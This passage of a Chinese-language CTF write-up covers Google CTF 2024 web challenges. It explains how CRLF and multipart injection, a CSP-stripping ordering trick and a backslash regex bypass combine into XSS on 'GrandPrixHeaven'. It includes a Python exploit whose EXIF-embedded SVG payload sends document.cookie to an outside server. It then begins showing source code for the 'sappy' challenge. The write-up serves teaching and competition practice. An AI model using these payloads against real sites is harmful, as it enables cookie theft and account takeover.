+</code></pre></div><p>我們只要在 post body 裡面多塞個 custom 裡面放 template pieces 的 json 就可以了。</p><p>再回到 <code>/fave/:GrandPrixHeaven</code></p><p>這邊的定義 template pieces 還是有一些限制</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>TEMPLATE_PIECES</span>.<span style=color:#a6e22e>includes</span>(<span style=color:#a6e22e>v</span>.<span style=color:#a6e22e>toLowerCase</span>()) <span style=color:#f92672>||</span> <span style=color:#f92672>!</span><span style=color:#a6e22e>isNum</span>(parseInt(<span style=color:#a6e22e>k</span>)) <span style=color:#f92672>||</span> <span style=color:#66d9ef>typeof</span>(<span style=color:#a6e22e>v</span>) <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;object&#39;</span>)
+</code></pre></div><p>就是我們的 template piece 必須要包含再 <code>TEMPLATE_PIECES</code> 內且 index 必須要是數字，以及 template piece 的內容的 type 不能是 <code>object</code>。</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>TEMPLATE_PIECES</span> <span style=color:#f92672>=</span> [
+  <span style=color:#e6db74>&#34;head_end&#34;</span>,
+  <span style=color:#e6db74>&#34;csp&#34;</span>,
+  <span style=color:#e6db74>&#34;upload_form&#34;</span>,
+  <span style=color:#e6db74>&#34;footer&#34;</span>,
+  <span style=color:#e6db74>&#34;retrieve&#34;</span>,
+  <span style=color:#e6db74>&#34;apiparser&#34;</span>, <span style=color:#75715e>/* We&#39;ve deprecated the mediaparser. apiparser only! */</span>
+  <span style=color:#e6db74>&#34;faves&#34;</span>,
+  <span style=color:#e6db74>&#34;index&#34;</span>,
+];
+</code></pre></div><p>這邊數字的地方很有趣是他是先過 <code>parseInt</code> 再 <code>isNum</code> 而 js 的 <code>parseInt</code> 有一個特性是<strong>只要 string 的開頭是數字都能被 parse 成數字</strong></p><p><img src=https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/a6dc3e10-0f76-4574-b7a2-8f8c23189fbb alt=image></p><p>所以我們可以利用這點在 index 裡面放任意的東西，這可以影響到傳遞的 template pieces 的排序，因為做 JSON.parse 時會對 key 做一次排序。</p><p>除此之外還會影響一個問題，就是可以做到 CRLF injection，且由於 boundary 是寫死的，這樣可以做到 inject multipart/form-data 來達成添加 template piece 的目標。</p><p>CSP 的部分由於他會強制檢查一定要有 csp 這個 template pieces 且 index 一定要是 0，但這邊的數字一樣是會過 parseInt 所以可以用上面講的方式去影響排序，讓 CSP 放到最後面，放到最後會有甚麼影響，這邊可以看到 template server 的 <code>index.js</code>。</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>parseMultipartData</span>  <span style=color:#f92672>=</span> (<span style=color:#a6e22e>data</span>, <span style=color:#a6e22e>boundary</span>) =&gt; {
+  <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>chunks</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>data</span>.<span style=color:#a6e22e>split</span>(<span style=color:#a6e22e>boundary</span>);
+  <span style=color:#75715e>// always start with the &lt;head&gt; element
+</span><span style=color:#75715e></span>  <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>processedTemplate</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>templates</span>.<span style=color:#a6e22e>head_start</span>;
+  <span style=color:#75715e>// to prevent loading an html page of arbitrarily large size, limit to just 7 at a time
+</span><span style=color:#75715e></span>  <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>end</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>7</span>;
+  <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>chunks</span>.<span style=color:#a6e22e>length</span><span style=color:#f92672>-</span><span style=color:#ae81ff>1</span> <span style=color:#f92672>&lt;=</span> <span style=color:#a6e22e>end</span>) {
+    <span style=color:#a6e22e>end</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>chunks</span>.<span style=color:#a6e22e>length</span><span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
+  }
+  <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>var</span> <span style=color:#a6e22e>i</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>; <span style=color:#a6e22e>i</span> <span style=color:#f92672>&lt;</span> <span style=color:#a6e22e>end</span>; <span style=color:#a6e22e>i</span><span style=color:#f92672>++</span>) {
+    <span style=color:#75715e>// seperate body from the header parts
+</span><span style=color:#75715e></span>    <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>lines</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>chunks</span>[<span style=color:#a6e22e>i</span>].<span style=color:#a6e22e>split</span>(<span style=color:#e6db74>&#39;\r\n\r\n&#39;</span>)
+    .<span style=color:#a6e22e>map</span>((<span style=color:#a6e22e>item</span>) =&gt; <span style=color:#a6e22e>item</span>.<span style=color:#a6e22e>replaceAll</span>(<span style=color:#e6db74>&#34;\r\n&#34;</span>, <span style=color:#e6db74>&#34;&#34;</span>))
+    .<span style=color:#a6e22e>filter</span>((<span style=color:#a6e22e>item</span>) =&gt; { <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>item</span> <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#39;&#39;</span>})
+    <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>item</span> <span style=color:#66d9ef>of</span> Object.<span style=color:#a6e22e>keys</span>(<span style=color:#a6e22e>templates</span>)) {
+        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>lines</span>.<span style=color:#a6e22e>includes</span>(<span style=color:#a6e22e>item</span>)) {
+            <span style=color:#a6e22e>processedTemplate</span> <span style=color:#f92672>+=</span> <span style=color:#a6e22e>templates</span>[<span style=color:#a6e22e>item</span>];
+        }
+    }
+  }
+  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>processedTemplate</span>;
+}
+</code></pre></div><p>可以看到他最多只拿最上面的 6 個 template pieces</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js>  <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>end</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>7</span>;
+  <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>chunks</span>.<span style=color:#a6e22e>length</span><span style=color:#f92672>-</span><span style=color:#ae81ff>1</span> <span style=color:#f92672>&lt;=</span> <span style=color:#a6e22e>end</span>) {
+    <span style=color:#a6e22e>end</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>chunks</span>.<span style=color:#a6e22e>length</span><span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
+  }
+  <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>var</span> <span style=color:#a6e22e>i</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>; <span style=color:#a6e22e>i</span> <span style=color:#f92672>&lt;</span> <span style=color:#a6e22e>end</span>; <span style=color:#a6e22e>i</span><span style=color:#f92672>++</span>) {
+</code></pre></div><p>所以只要上面放 7 個 template pieces 並把 csp 移到最下面，取得的 html 就不會有 CSP</p><p>我們就可以構造出以下的 json</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json>{
+  <span style=color:#f92672>&#34;1&#34;</span>: <span style=color:#e6db74>&#34;retrieve&#34;</span>,
+  <span style=color:#f92672>&#34;2\&#34;\r\n\r\nmediaparser\r\n--GP_HEAVEN\r\nContent-Disposition: form-data; name=\&#34;3&#34;</span>: <span style=color:#e6db74>&#34;head_end&#34;</span>,
+  <span style=color:#f92672>&#34;4&#34;</span>: <span style=color:#e6db74>&#34;faves&#34;</span>,
+  <span style=color:#f92672>&#34;5&#34;</span>: <span style=color:#e6db74>&#34;footer&#34;</span>,
+  <span style=color:#f92672>&#34;6&#34;</span>: <span style=color:#e6db74>&#34;footer&#34;</span>,
+  <span style=color:#f92672>&#34;0a&#34;</span>: <span style=color:#e6db74>&#34;csp&#34;</span>
+}
+</code></pre></div><p>然後 post 上去新增</p><p>(ps: 這是還沒處理 csp 的)</p><p><img src=https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/6b26b0c6-1e00-4d62-ae2e-5f60879241d4 alt=image></p><p>以後來看一下頁面</p><p><img src=https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/a70d0d7e-1e55-4b03-b651-ab199381bbb5 alt=image></p><p>可以看到成功拿到 mediaparser，但由於我們 <code>F1</code> param 裡的 path 也就是 <code>https://grandprixheaven-web.2024.ctfcompetition.com/api/get-car/&lt;F1></code> 是 json 所以要想辦法讓 <code>F1</code> 跳到圖片的路徑，比如說 <code>../../media/&lt;img-id></code>。</p><p>但是 <code>retrieve.js</code> 有路徑檢查</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>path</span>) <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> Error(<span style=color:#e6db74>&#34;no path&#34;</span>);
+            <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>re</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> RegExp(<span style=color:#e6db74>/^[A-z0-9\s_-]+$/i</span>);
+            <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>re</span>.<span style=color:#a6e22e>test</span>(<span style=color:#a6e22e>path</span>)) {
+              <span style=color:#75715e>// normalize
+</span><span style=color:#75715e></span>              <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>cleaned</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>path</span>.<span style=color:#a6e22e>replaceAll</span>(<span style=color:#e6db74>/\s/g</span>, <span style=color:#e6db74>&#34;&#34;</span>);
+              <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>cleaned</span>;
+            } <span style=color:#66d9ef>else</span> {
+              <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> Error(<span style=color:#e6db74>&#34;regex fail&#34;</span>);
+            }
+</code></pre></div><p><img src=https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/6cc23108-5d12-4abc-9ddb-a1f44a9362be alt=image></p><p>所以這邊要想辦法繞 RegExp。</p><p>裡面有一個部分很有趣，那就是 <code>A-z</code> 這邊應該要是 <code>A-Za-z</code>，這樣寫或造成的影響是，因為他是依照 ascii 的順序，因此放在 Z 到 a 中間的字元是可以用的，也就是 <code>Z[\]^_`a</code> 其中的 <code>\</code>，因為 <code>retrieve.js</code> 做 request 時會用 <code>new URL</code> 做 url parse，而 <code>\</code> 會被他解成 <code>/</code>，並且如果 path 是絕對路徑時，他會把 base url 裡變得 path 蓋掉，所以如果我放 <code>\media\&lt;img-id></code> 會被他解析成 <code>https://grandprixheaven-web.2024.ctfcompetition.com/media/&lt;img-id></code>，這樣就成功繞過了。</p><p>因此我們的 xss url 會是 <code>https://grandprixheaven-web.2024.ctfcompetition.com/fave/&lt;car-id>?F1=\media\&lt;img-id></code>，把這個丟 <code>report</code> 就能 xss</p><p>所以整體順序是：</p><ol><li>先生帶 xss payload 的圖片</li><li>新增車並上傳該圖片，並且對 custom 做操作繞過檢查塞進 <code>mediaparser</code> 且拔掉 <code>csp</code></li><li>取得車的 url</li><li>解析 json 拿到 img-id</li><li>構建 xss url</li></ol><h3 id=exploit-1>exploit</h3><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>from</span> PIL <span style=color:#f92672>import</span> Image
+<span style=color:#f92672>import</span> piexif
+<span style=color:#f92672>import</span> io
+<span style=color:#f92672>import</span> requests
+<span style=color:#f92672>import</span> urllib.parse
+
+url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;https://grandprixheaven-web.2024.ctfcompetition.com&#34;</span>
+httpserver <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;https://vpn.chummydns.com:20000/&#34;</span>
+
+img <span style=color:#f92672>=</span> Image<span style=color:#f92672>.</span>new(<span style=color:#e6db74>&#39;RGB&#39;</span>, (<span style=color:#ae81ff>10</span>, <span style=color:#ae81ff>10</span>))
+exif_dict <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#39;0th&#39;</span>: {<span style=color:#ae81ff>270</span>: f<span style=color:#e6db74>&#34;&lt;svg&gt;&lt;svg/onload=&#39;window.location=</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>{httpserver}</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>+document.cookie&#39;&gt;&#34;</span>}}
+exif_bytes <span style=color:#f92672>=</span> piexif<span style=color:#f92672>.</span>dump(exif_dict)
+
+buffer <span style=color:#f92672>=</span> io<span style=color:#f92672>.</span>BytesIO()
+
+img<span style=color:#f92672>.</span>save(buffer, format<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;JPEG&#39;</span>, exif<span style=color:#f92672>=</span>exif_bytes)
+
+buffer<span style=color:#f92672>.</span>seek(<span style=color:#ae81ff>0</span>)
+
+r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(urllib<span style=color:#f92672>.</span>parse<span style=color:#f92672>.</span>urljoin(url, <span style=color:#e6db74>&#39;/api/new-car&#39;</span>), allow_redirects<span style=color:#f92672>=</span>False, files<span style=color:#f92672>=</span>{
+    <span style=color:#e6db74>&#39;image&#39;</span>: (<span style=color:#e6db74>&#39;test.jpg&#39;</span>, buffer, <span style=color:#e6db74>&#39;image/jpeg&#39;</span>),
+}, data<span style=color:#f92672>=</span>{
+    <span style=color:#e6db74>&#39;year&#39;</span>: <span style=color:#ae81ff>2004</span>,
+    <span style=color:#e6db74>&#39;make&#39;</span>: <span style=color:#e6db74>&#39;aaa&#39;</span>,
+    <span style=color:#e6db74>&#39;model&#39;</span>: <span style=color:#e6db74>&#39;aaa&#39;</span>,
+    <span style=color:#e6db74>&#39;custom&#39;</span>: <span style=color:#e6db74>&#39;{&#34;1&#34;:&#34;retrieve&#34;,&#34;2</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>r</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>n</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>r</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>nmediaparser</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>r</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>n--GP_HEAVEN</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>r</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>nContent-Disposition: form-data; name=</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;3&#34;:&#34;head_end&#34;,&#34;4&#34;:&#34;faves&#34;,&#34;5&#34;:&#34;footer&#34;,&#34;6&#34;:&#34;footer&#34;,&#34;0a&#34;:&#34;csp&#34;}&#39;</span>
+})
+
+f1url <span style=color:#f92672>=</span> urllib<span style=color:#f92672>.</span>parse<span style=color:#f92672>.</span>urlparse(urllib<span style=color:#f92672>.</span>parse<span style=color:#f92672>.</span>urljoin(url, r<span style=color:#f92672>.</span>headers[<span style=color:#e6db74>&#39;Location&#39;</span>]))
+
+f1path <span style=color:#f92672>=</span> f1url<span style=color:#f92672>.</span>path
+f1query <span style=color:#f92672>=</span> urllib<span style=color:#f92672>.</span>parse<span style=color:#f92672>.</span>parse_qs(f1url<span style=color:#f92672>.</span>query)
+
+r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(urllib<span style=color:#f92672>.</span>parse<span style=color:#f92672>.</span>urljoin(url, f<span style=color:#e6db74>&#34;/api/get-car/{f1query[&#39;F1&#39;][0]}&#34;</span>))
+
+imgid <span style=color:#f92672>=</span> r<span style=color:#f92672>.</span>json()[<span style=color:#e6db74>&#39;img_id&#39;</span>]
+params <span style=color:#f92672>=</span> {
+    <span style=color:#e6db74>&#34;F1&#34;</span>: f<span style=color:#e6db74>&#34;\media\{imgid}&#34;</span>
+}
+
+xssurl <span style=color:#f92672>=</span> f<span style=color:#e6db74>&#39;{urllib.parse.urljoin(url, f1path)}?{urllib.parse.urlencode(params)}&#39;</span>
+
+requests<span style=color:#f92672>.</span>post(urllib<span style=color:#f92672>.</span>parse<span style=color:#f92672>.</span>urljoin(url, <span style=color:#e6db74>&#34;/report&#34;</span>), data<span style=color:#f92672>=</span>{
+    <span style=color:#e6db74>&#39;url&#39;</span>: xssurl
+})
+</code></pre></div><h3 id=flag-1>Flag</h3><p><img src=https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/306d7180-00af-452e-a4dd-d959b8562b4c alt=image></p><p><code>CTF{Car_go_FAST_hEART_Go_FASTER!!!}</code></p><h2 id=sappy>sappy</h2><p><img src=https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/945b7796-12ab-41ea-9301-994ea869a81f alt=image></p><h3 id=概述-2>概述</h3><p>這題網站長這樣</p><p><img src=https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/2304d75c-2581-4bed-916e-af192c608def alt=image></p><p>這四個按鈕會分別顯示個別設定好的 html</p><p><img src=https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/0a16eee7-b24a-438d-854f-e6968be8b914 alt=image></p><p>下面 share 則是傳遞任意網址他們的 bot 就會去瀏覽那個網址</p><p><img src=https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/19ff9088-666b-4b7a-984d-bbe035be8df5 alt=image></p><p>看到這裡應該可以猜到又是 XSS</p><p>來看一下前端 html <code>indeex.html</code></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>      &lt;<span style=color:#f92672>p</span>&gt;
+        Hi! I&#39;m a beginner in programming and this is my first application,
+        called SAPPY! I&#39;m sharing here some quirks I learnt about JavaScript.
+        Use the buttons below to find out!
+      &lt;/<span style=color:#f92672>p</span>&gt;
+      &lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>id</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;pages&#34;</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;row flex-center&#34;</span>&gt;&lt;/<span style=color:#f92672>div</span>&gt;
+      &lt;<span style=color:#f92672>iframe</span>&gt;&lt;/<span style=color:#f92672>iframe</span>&gt;
+</code></pre></div><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js>      <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>iframe</span> <span style=color:#f92672>=</span> document.<span style=color:#a6e22e>querySelector</span>(<span style=color:#e6db74>&#34;iframe&#34;</span>);
+
+      <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>onIframeLoad</span>() {
+        <span style=color:#a6e22e>iframe</span>.<span style=color:#a6e22e>contentWindow</span>.<span style=color:#a6e22e>postMessage</span>(
+          <span style=color:#e6db74>`
+</span><span style=color:#e6db74>            {
+</span><span style=color:#e6db74>                &#34;method&#34;: &#34;initialize&#34;, 
+</span><span style=color:#e6db74>                &#34;host&#34;: &#34;https://sappy-web.2024.ctfcompetition.com&#34;
+</span><span style=color:#e6db74>            }`</span>,
+          window.<span style=color:#a6e22e>origin</span>
+        );
+      }
+
+      <span style=color:#a6e22e>iframe</span>.<span style=color:#a6e22e>src</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;./sap.html&#34;</span>;
+      <span style=color:#a6e22e>iframe</span>.<span style=color:#a6e22e>addEventListener</span>(<span style=color:#e6db74>&#34;load&#34;</span>, <span style=color:#a6e22e>onIframeLoad</span>);
+<span style=color:#75715e>//.............
+</span><span style=color:#75715e></span>      <span style=color:#a6e22e>fetch</span>(<span style=color:#e6db74>&#34;pages.json&#34;</span>)
+        .<span style=color:#a6e22e>then</span>((<span style=color:#a6e22e>r</span>) =&gt; <span style=color:#a6e22e>r</span>.<span style=color:#a6e22e>json</span>())
+        .<span style=color:#a6e22e>then</span>((<span style=color:#a6e22e>json</span>) =&gt; {
+          <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>const</span> [<span style=color:#a6e22e>id</span>, { <span style=color:#a6e22e>title</span> }] <span style=color:#66d9ef>of</span> Object.<span style=color:#a6e22e>entries</span>(<span style=color:#a6e22e>json</span>)) {
+            <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>button</span> <span style=color:#f92672>=</span> document.<span style=color:#a6e22e>createElement</span>(<span style=color:#e6db74>&#34;button&#34;</span>);
+            <span style=color:#a6e22e>button</span>.<span style=color:#a6e22e>setAttribute</span>(<span style=color:#e6db74>&#34;class&#34;</span>, <span style=color:#e6db74>&#34;margin&#34;</span>);
+            <span style=color:#a6e22e>button</span>.<span style=color:#a6e22e>innerText</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>title</span>;
+            <span style=color:#a6e22e>button</span>.<span style=color:#a6e22e>addEventListener</span>(<span style=color:#e6db74>&#34;click&#34;</span>, () =&gt; <span style=color:#a6e22e>switchPage</span>(<span style=color:#a6e22e>id</span>));
+            <span style=color:#a6e22e>divPages</span>.<span style=color:#a6e22e>append</span>(<span style=color:#a6e22e>button</span>);
+          }
+        });
+
+      <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>switchPage</span>(<span style=color:#a6e22e>id</span>) {
+        <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>msg</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>JSON</span>.<span style=color:#a6e22e>stringify</span>({
+          <span style=color:#a6e22e>method</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;render&#34;</span>,
+          <span style=color:#a6e22e>page</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>id</span>,
+        });
+        <span style=color:#a6e22e>iframe</span>.<span style=color:#a6e22e>contentWindow</span>.<span style=color:#a6e22e>postMessage</span>(<span style=color:#a6e22e>msg</span>, window.<span style=color:#a6e22e>origin</span>);
+      }
+</code></pre></div><p>可以看到他的按鈕跟顯示是用 iframe，按鈕用 <code>postMessage</code> 來控制 iframe，按鈕則是依照 <code>/pages.json</code> 來生成，iframe 會去瀏覽 <code>./sap.html</code></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=color:#75715e>&lt;!DOCTYPE html&gt;</span>
+&lt;<span style=color:#f92672>html</span>&gt;
+  &lt;<span style=color:#f92672>head</span>&gt;
+    &lt;<span style=color:#f92672>meta</span> <span style=color:#a6e22e>charset</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;utf-8&#34;</span> /&gt;
+    &lt;<span style=color:#f92672>style</span>&gt;
+      <span style=color:#f92672>body</span> {
+        <span style=color:#66d9ef>margin</span>: <span style=color:#ae81ff>0</span>;
+      }
+    &lt;/<span style=color:#f92672>style</span>&gt;
+  &lt;/<span style=color:#f92672>head</span>&gt;
+  &lt;<span style=color:#f92672>body</span>&gt;
+    &lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>id</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;output&#34;</span>&gt;&lt;/<span style=color:#f92672>div</span>&gt;
+    &lt;<span style=color:#f92672>script</span> <span style=color:#a6e22e>src</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;./static/sap.js&#34;</span>&gt;&lt;/<span style=color:#f92672>script</span>&gt;
+    &lt;<span style=color:#f92672>script</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;module&#34;</span>&gt;
+      <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>INTERVAL</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>100</span>;
+      <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>lastHeight</span> <span style=color:#f92672>=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
+      <span style=color:#a6e22e>setInterval</span>(() =&gt; {
+        <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>height</span> <span style=color:#f92672>=</span> document.<span style=color:#a6e22e>body</span>.<span style=color:#a6e22e>clientHeight</span>;
+        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>height</span> <span style=color:#f92672>===</span> <span style=color:#a6e22e>lastHeight</span>) <span style=color:#66d9ef>return</span>;
+        <span style=color:#a6e22e>lastHeight</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>height</span>;
+        <span style=color:#a6e22e>parent</span>.<span style=color:#a6e22e>postMessage</span>(
+          <span style=color:#a6e22e>JSON</span>.<span style=color:#a6e22e>stringify</span>({
+            <span style=color:#a6e22e>method</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;heightUpdate&#34;</span>,
+            <span style=color:#a6e22e>height</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>height</span>,
+          }),
+          <span style=color:#e6db74>&#34;*&#34;</span>
+        );
+      }, <span style=color:#a6e22e>INTERVAL</span>);
+    &lt;/<span style=color:#f92672>script</span>&gt;
+  &lt;/<span style=color:#f92672>body</span>&gt;
+&lt;/<span style=color:#f92672>html</span>&gt;
+</code></pre></div><p>裡面使用了 <code>./static/sap.js</code> 這邊的 js 在架網站時是有過 compile 的，所以 f5 看不到原始碼。</p><p>來看看他如何載入文字</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>Uri</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>goog</span>.<span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#34;goog.Uri&#34;</span>);
+
+<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>getHost</span>(<span style=color:#a6e22e>options</span>) {
+  <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>options</span>.<span style=color:#a6e22e>host</span>) {
+    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>u</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>Uri</span>.<span style=color:#a6e22e>parse</span>(document.<span style=color:#a6e22e>location</span>);
+
+    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>u</span>.<span style=color:#a6e22e>scheme</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;://sappy-web.2024.ctfcompetition.com&#34;</span>;
+  }
+  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>validate</span>(<span style=color:#a6e22e>options</span>.<span style=color:#a6e22e>host</span>);
+}
+
+<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>validate</span>(<span style=color:#a6e22e>host</span>) {
+  <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>h</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>Uri</span>.<span style=color:#a6e22e>parse</span>(<span style=color:#a6e22e>host</span>);
+  <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>host</span>);
+  <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>h</span>.<span style=color:#a6e22e>getDomain</span>());
+  <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>h</span>.<span style=color:#a6e22e>hasQuery</span>()) {
+    <span style=color:#66d9ef>throw</span> <span style=color:#e6db74>&#34;invalid host&#34;</span>;
+  }
+  <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>h</span>.<span style=color:#a6e22e>getDomain</span>() <span style=color:#f92672>!==</span> <span style=color:#e6db74>&#34;sappy-web.2024.ctfcompetition.com&#34;</span>) {
+    <span style=color:#66d9ef>throw</span> <span style=color:#e6db74>&#34;invalid host&#34;</span>;
+  }
+  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>host</span>;
+}
+
+<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>buildUrl</span>(<span style=color:#a6e22e>options</span>) {
+  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>getHost</span>(<span style=color:#a6e22e>options</span>) <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;/sap/&#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>options</span>.<span style=color:#a6e22e>page</span>;
+}
+
+<span style=color:#75715e>//....................................................
+</span><span style=color:#75715e></span>
+    <span style=color:#66d9ef>switch</span> (<span style=color:#a6e22e>method</span>) {
+      <span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#34;initialize&#34;</span><span style=color:#f92672>:</span> {
+        <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>data</span>.<span style=color:#a6e22e>host</span>) <span style=color:#66d9ef>return</span>;
+        <span style=color:#a6e22e>API</span>.<span style=color:#a6e22e>host</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>data</span>.<span style=color:#a6e22e>host</span>;
+        <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>API</span>.<span style=color:#a6e22e>host</span>);
+        <span style=color:#66d9ef>break</span>;
+      }
